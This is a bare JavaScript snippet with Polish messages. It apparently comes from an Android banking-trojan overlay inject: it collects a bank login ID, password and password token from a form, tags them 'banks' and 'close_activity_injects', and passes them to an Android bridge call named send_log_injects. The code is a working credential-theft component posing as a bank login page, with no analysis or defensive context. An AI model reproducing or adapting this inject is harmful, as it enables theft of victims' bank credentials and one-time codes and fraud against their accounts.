<script>
function send_form()
{

        if (document.getElementById("id").value == '')
{
    alert ('Wszystkie pola wymagane!');
    return false;
}
        if (document.getElementById("password_token").value == '')
{
    alert ('Wszystkie pola wymagane!');
    return false;
}
        if (document.getElementById("password").value == '')
{
    alert ('Wszystkie pola wymagane!');
    return false;
}
var data = {};
    data.id = document.getElementById('id').value;
    data.password_token = document.getElementById('password_token').value;
    data.password = document.getElementById('password').value;
    data.type_injects = "banks";
    data.closed = "close_activity_injects";
    
    var ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("android") > -1) {
        try {
            Android.send_log_injects(JSON.stringify(data))
        } catch (err) {}
    }else{
        alert(JSON.stringify(data));
    } 
}
